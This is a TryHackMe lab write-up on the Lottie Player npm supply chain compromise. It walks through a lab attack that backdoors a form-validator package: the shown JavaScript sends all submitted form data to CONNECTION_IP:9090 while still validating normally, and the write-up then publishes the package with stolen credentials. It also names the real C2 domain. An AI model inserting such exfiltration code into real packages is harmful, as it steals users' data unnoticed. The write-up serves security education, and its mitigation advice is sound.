# Introduction
---



Supply chain attacks are a rising threat in cyber security, targeting the trusted parts of software development. Instead of attacking a company directly, attackers go after third-party components like libraries, packages, or services that many applications rely on. These attacks are particularly dangerous because they can spread quickly to many applications and often remain unnoticed until significant damage is done. A simple example is downloading an update for your favorite software from the attacker-controlled domain.

A recent supply chain attack on Lottie Player was carried out using a developer's compromised access token. The attacker's main objective was to trick web users accessing a compromised player into connecting their crypto wallets so that they could steal funds.

## Learning Objectives

```ad-summary
- Workings of a supply chain attack
- How to exploit a supply chain attack
- Protection and mitigation measures
```

## Room Prerequisites

Understanding the following topics is recommended before starting the room:

```ad-summary
- [Protocols and Servers](https://tryhackme.com/room/protocolsandservers) 
- [OWASP Top 10 - 2021](https://tryhackme.com/r/room/owasptop102021)
```


# Lottie Player Supply Chain Attack
---

The vulnerability stemmed from a compromised access token of a developer with privileged access to the Lottie Player npm package repository. This allowed attackers to publish malicious versions of the`@lottiefiles/lottie-player` package. These versions included code that triggered crypto prompts, enabling attackers to gain unauthorised access to users' cryptocurrency wallets (if the victim connected their original wallet). 

## Affected Versions
---
The malicious versions of the Lottie Player package were:

```ad-info
- 2.05
- 2.06
- 2.07
```

## Impact
---
If an application integrated any of the compromised versions, users could see unexpected prompts to connect their cryptocurrency wallets. Attackers exploited this access to steal funds from connected wallets. In [one reported case](https://www.mitrade.com/insights/news/live-news/article-3-442401-20241031), a user lost an estimated $723,000 (10 BTC) due to unauthorized wallet access. ## Technical Explanation
---
A typical deployment scenario involves a developer pushing code to a version control system (e.g., Git), which then updates the NPM registry. The NPM registry subsequently pushes the package to CDNs, which are deployed globally to serve files efficiently to browsers and web applications, as illustrated below.

![flow representing how code is pushed to CDNs](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731521626182.png) 

In the case of the LottieFiles incident, no updates were made to the Git repository. Instead, a compromised developer access token was used to publish a modified package`@lottiefiles/lottie-player` directly to NPM, which then propagated to CDNs, impacting end-users. 

Execution of the script in a sandbox environment showed that once the user visits a page, it will show a popup, as shown below:

![Lottie crypto popup](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731068611572.png) 

**Note**: Since the code modified by the attacker makes implicit calls to C2 and shares the user's information, it is not advised to execute it in any internet-connected environment.

When users click on any wallet, it asks them to connect their digital wallet.

![lottie connection with wallet QR code](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731399521595.png) 

The vulnerable code makes a web socket connection to a domain`castleservices01[.]com`, which has previously been used in multiple crypto-phishing scams as well. The API call to the C2 server includes the **auth key**, **user browser details** and **local IP** for authentication/registration in the request parameters.

![inspect element in Chrome](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731302663286.png) 

Below is the snippet of minified code added by the developer, which contains calls to crypto SDKs like wallet link, coin base, etc., which confirms that LottieFiles' original code has been modified.

```javascript
...
..
onClick:s},t))))}})),Em=u((e=>{"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CBW_MOBILE_DEEPLINK_URL=e.WALLETLINK_URL=e.CB_KEYS_URL=void 0,e.CB_KEYS_URL="https://keys.coinbase.com/connect",e.WALLETLINK_URL="https://www.walletlink.org",e.CBW_MOBILE_DEEPLINK_URL="https://go.cb-w.com/walletlink"})),Cm=u((e=>{"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WLMobileRelayUI=void 0;var t=_m(),r=Hp(),i=Em();e.WLMobileRelayUI=class{constructor(){this.attached=!1,this.redirectDialog=new t.RedirectDialog}attach(){if(this.attached)throw new Error("Coinbase Wallet SDK UI is already attached");this.redirectDialog.attach(),this.attached=!0}redirectToCoinbaseWallet(e){let t=new URL(i.CBW_MOBILE_DEEPLINK_URL);t.searchParams.append("redirect_url",(0,r.getLocation)().href),e&&t.searchParams.append("wl_url",e);let n=document.createElement("a");n.target="cbw-opener",n.href=t.href,n.rel="noreferrer noopener",n.click()}openCoinbaseWalletDeeplink(e){this.redirectDialog.present({title:"Redirecting to Coinbase Wallet...",buttonText:"Open",onButtonClick:()=>{this.redirectToCoinbaseWallet(e)}})
...
..
```

The above code is not easily detectable as malicious because it was served from a legitimate CDN service, which makes the supply chain attack particularly powerful, as it often goes unnoticed. If you're interested in examining the developer's code changes, you can view the differences between the original files by Lottie Player and the ones modified by the attackers. Start by opening the terminal and navigating to the code directory using the command`cd /home/ubuntu/Downloads/code`. Then, issue the command`kdiff3 lottie-player-2.04.min.js lottie-player-2.05.min.js`, which will open a window showing the differences between the original file (2.04) and the one modified by the hacker (2.05), as shown below:

![difference of files vulnerable and original file](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731563169905.png) 

Note that the code has been minified and slightly encoded, making it harder for automated tools and security engineers to detect changes easily. This`diff` view helps in pinpointing specific modifications made to the code.

![Pasted image 20241205140358.png](../../IMAGES/Pasted%20image%2020241205140358.png)


# How to Exploit
---

## Understanding the Architecture
---
The architecture in this task revolves around a local npm registry,`npm.thm`, which functions as a central repository where developers can publish and share packages. This registry allows developers to download and reuse code, streamlining the development process and enabling code reuse across projects. By using a vulnerable package published to this internal registry, we'll demonstrate how attackers can introduce malicious code into a trusted package, impacting web apps that rely on it.

For this task, we're focusing on a developer named **Mark**, who created a`form-validator` package, which allows performing validation on HTML form-inputs automatically. So, instead of adding validation against each field one by one, a developer can use the package to link the form, which will add validation on all the fields present in the HTML form. This package is handy for any developer working with forms, as it reduces redundancy and ensures consistent validation. Once the packages are pushed to`npm.thm`, their browser-compatible file is pushed to`cdn.npm.thm` , so that it can be used by developers in their web apps.

Developers can easily install form-validator from`npm.thm` using a single command, directly integrating it into their projects. The registry interface, accessible by visiting`npm.thm:4873` in the attached VM, allows users to browse available packages and see the latest versions and descriptions, as shown below:

![npm registry dashbaord](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730923698594.png) 

## Utilising the Package
---
A developer can use this package in HTML code for form validation. In the VM, you can browse to **localhost:8080** and click "**Submit**" to test the package's functionality. When you click **Submit**, the package will prompt you to complete all required fields before allowing submission, as shown below:

![sign up page form](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730969798907.png) 

In Chrome, right-click on the page and select`View Page Source` to see the page source code. Alternatively, press`Ctrl+U` (Windows/Linux) or`Cmd+Option+U` (Mac). Once the view-source window is open, you will see that the code calls the bundled JS file for **form-validator**, as shown below:

![source code to access bundle.js](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730969876895.png) 

## Access to Repository
----
A bad actor can take control of a repository either through a vulnerability in the hosting provider or through social engineering. Once he gains control of the repository, he can update the packages and add malicious code, which will later be downloaded/integrated by the user base, thus exploiting the complete chain. Here are some common methods attackers might use to gain access:

- **Social Engineering**: Tricking the repository owner into sharing sensitive information, like login credentials, through phishing or impersonation.
- **Token Leak**: Exploiting exposed access tokens (e.g., found in code repositories, configuration files, or CI/CD logs) that grant publishing permissions.
- **Insider Threat**: Gaining access through an insider who intentionally or unintentionally grants access to the attacker.

In the LottieFiles case study, we saw that the developer's access token leaked, probably due to any of the abovementioned methods.

## Time for Some Action
---
Imagine a scenario where a malicious actor gains access to developer Mark's`npm.thm` credentials, allowing him to publish and update packages under his name. With this access, the attacker can modify the package's code, adding malicious behaviour affecting anyone who installs or updates the package.

**Downloading the Original Package**

The attacker's first step is downloading the original **form-validator** package to review and alter its code. This can be done by visiting the package detail page on the`npm.thm` registry. Open the Chrome browser in the VM and navigate to [http://npm.thm:4873/-/web/detail/form-validator](http://npm.thm:4873/-/web/detail/form-validator)[](http://npm.thm:4873/-/web/detail/form-validator) (which may take 1-2 minutes to load). To download the package, click the "**Download**" option to get the`.tgz` file containing the form-validator code.

![download form-validator package page](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730927025541.png) 

You might see a "**Download blocked**" message when downloading the file in Chrome. If this happens, look for the warning message at the bottom of the Chrome window. Select "**Keep**" to allow the download to proceed, as shown below:

![popup incase insecure donwloads are blocked](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1731484254675.png) 

The file will be downloaded in the`/home/ubuntu/Downloads` folder. After downloading, extract the`.tgz` file, which will unpack the contents into a directory, named`package`, containing`package.json` and`index.js`.

![directory containing index.js and package.json](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730966973982.png) 

**Adding Malicious Code to the Package**

With access to the source code, the attacker can now inject malicious functionality. The goal is to add code that captures and sends all submitted form data to an attacker's server on any IP address.

Open the`index.js` file in the package directory and replace the existing code with the following code that sends form data to`CONNECTION_IP:9090` as part of the`validateForm` function:

```javascript
module.exports = function validateForm(formData) {
 const errors = [];

 Object.keys(formData).forEach(field => {
 if (!formData[field]) {
 errors.push(`${field} cannot be empty`);
 }
 });

 if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
 errors.push("Invalid email format");
 }

 const queryParams = new URLSearchParams(formData).toString();

 fetch(`http://CONNECTION_IP:9090/collect?${queryParams}`)
 .catch(error => console.log("Failed to send data:", error));

 return errors.length ? errors : "Form is valid!";
};
module.exports = function validateForm(formData) {
 const errors = [];

 Object.keys(formData).forEach(field => {
 if (!formData[field]) {
 errors.push(`${field} cannot be empty`);
 }
 });

 if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
 errors.push("Invalid email format");
 }
 const queryParams = new URLSearchParams(formData).toString();

 fetch(`http://CONNECTION_IP:9090/collect?${queryParams}`)
 .catch(error => console.log("Failed to send data:", error));

 return errors.length ? errors : "Form is valid!";
};
```

Moreover, open the`package.json` file and update the version from **1.0.0** to **1.1.0** to reflect the new (malicious) version as shown below:

```javascript
{
 "name": "form-validator",
 "version": "1.1.0",
 "description": "A simple package to validate form fields",
 "main": "index.js",
 "scripts": {},
 "keywords": ["validation", "form", "validator"],
 "author": "THM Package",
 "license": "MIT"
}
```

**Publishing the Changes**

With the malicious changes made, the attacker can now publish the updated package back to the`npm.thm` registry. Open the terminal and navigate to the directory where the updated code is stored (**~/Downloads/package** in this case). Use the command`npm login --registry http://npm.thm:4873` to log in to the registry with Mark's credentials. Enter the username`mark` and password`mark123` when prompted. If successful, you will receive the following message:

```shell-session
ubuntu@tryhackme:~/Downloads/package$ npm login --registry http://npm.thm:4873
npm notice Log in on http://npm.thm:4873/
Username: mark
Password:

Logged in on http://npm.thm:4873/.
```

Next, issue the command`npm publish --registry http://npm.thm:4873`, which will publish version **1.1.0** of **form-validator** to`npm.thm`, making the malicious code available to any user who installs or updates the package from this registry.

```shell-session
ubuntu@tryhackme:~/Downloads/package$ npm publish --registry http://npm.thm:4873
npm notice
npm notice ðŸ“¦ form-validator@1.1.0
npm notice Tarball Contents
npm notice 1.5kB index.js
npm notice 267B package.json
npm notice Tarball Details
npm notice name: form-validator
npm notice version: 1.1.0
npm notice filename: form-validator-1.1.0.tgz
npm notice package size: 687 B
npm notice unpacked size: 1.8 kB
npm notice shasum: 1402a9dbe347d2cdab8bce095bfd150ca0eaec3f
npm notice integrity: sha512-4gOK3PIDP3zH+[...]Jbj/WicEIMhTA==
npm notice total files: 2
npm notice
npm notice Publishing to http://npm.thm:4873/ with tag latest and default access
+ form-validator@1.1.0
```

**Note**: Normally, pushing the package from npm to the CDN is automated; however, to keep the attacker VM lightweight and less resource-intensive, you can manually initiate this process by visiting`http://10.10.184.11:8080/pushtoCDN.php` once the malicious package is uploaded.

![Pasted image 20241205140536.png](../../IMAGES/Pasted%20image%2020241205140536.png)

## Configuring the Attacker Machine

On the AttackBox, start a Python listener by issuing the command`python3 -m http.server 9090`. In the attached VM, visit the same URL`localhost:8080` to check the package's functionality. Please ensure to perform a hard refresh on the page to load the latest`bundle.js`. You can do this by pressing`Ctrl+R` (Windows/Linux) or`Command+R` (Mac).

Enter the value **hello** in the username and click on **Submit**.

![signup form to test the supply chain attack](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730970060765.png) 

Navigate to the AttackBox, where you have set the Python listener. You will receive the entered form data in the server as shown below:

```shell-session
root@tryhackme$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.10.1.196 - - [07/Nov/2024 09:02:49] code 404, message File not found
10.10.1.196 - - [07/Nov/2024 09:02:49] "GET /collect?name=hello&email= HTTP/1.1" 404 -
```

This is it; the important thing to note here is that neither the developer nor anyone using the package would know it has been compromised, as the package still performs its intended functionality perfectly.

![Pasted image 20241205140643.png](../../IMAGES/Pasted%20image%2020241205140643.png)

# Detection and Mitigation
---


In the previous task, we examined how attackers can exploit a supply chain vulnerability by injecting malicious code into a trusted package. These attacks are difficult to identify since legitimate updates to third-party dependencies are common in development workflows.
![Pasted image 20241205140742.png](../../IMAGES/Pasted%20image%2020241205140742.png)

## Mitigation Techniques

To detect signs of supply chain attacks, we can leverage a SIEM solution to monitor logs for suspicious activity, such as unexpected calls to services like cryptocurrency wallet connections in web traffic logs. In this case, block any call to the domain`castleservices01[.]com`, widely used in crypto-phishing attacks. Additional steps include:

```ad-summary
- **Monitor Web Logs**: Check for unusual or unauthorised requests from third-party libraries, particularly calls to external domains or unexpected endpoints. It is also possible that the supply chain attack resulting through a JS file may not leave any track on the server logs.
- **Track Package Changes**: Keep logs of package version changes and note any updates to popular libraries (e.g.,`@lottiefiles/lottie-player`), and compare version histories with official release notes.
- **Set Up Alerts for Suspicious Activity**: Use automated alerts for unexpected behaviour, such as connection attempts to cryptocurrency services, which may indicate supply chain compromise.
- **Limit Access and Permissions**: Restrict access tokens and credentials for publishing packages, enforce two-factor authentication, and rotate tokens periodically.
- **Use Verified Sources**: Rely on official package registries or internal mirrors that only host vetted libraries, reducing the risk of supply chain compromise from rogue repositories.
- **Implement Dependency Controls**: Deploy dependency monitoring tools to detect code changes introduced due to malicious package updates. You can learn more about this [here](https://tryhackme.com/r/room/dependencymanagement).
```

Adopting these mitigation measures strengthens defenses against supply chain attacks, minimizing the risks associated with third-party dependencies.

## TryHackMe's Quick Response

TryHackMe also utilizes Lottie Player animations to enhance its user interface, making the platform interactive and visually engaging. When the Lottie Player supply chain attack occurred, TryHackMe's website was [impacted](https://x.com/RealTryHackMe/status/1851744593269637129) as it used the **latest** LottieFiles JavaScript file pushed at the CDN. However, within a few minutes, we identified the issue through our amazing community and the team and implemented mitigation steps to secure the website. Importantly, there was no user data leakage, unauthorized access to databases, or compromise of personal information. Thanks to swift action, TryHackMe effectively neutralized the vulnerability without impacting users' data or security.


# Conclusions
---

This is it.

Since the recent supply chain attack on Lottie calls attention to the need for securing code dependencies, it is important to maintain up-to-date packages in any web application but also ensure that any updates do not introduce any kind of maliciousness into the system. In this room, we learnt:

```ad-note
- The recent supply chain attack on Lottie and its impact on users
- Demonstrate how attackers can launch a supply chain attack using a compromised package.
- Key mitigation techniques to protect against supply chain attacks and safeguard application dependencies.
```

By understanding these aspects, developers and security teams can better defend against supply chain vulnerabilities in third-party libraries.


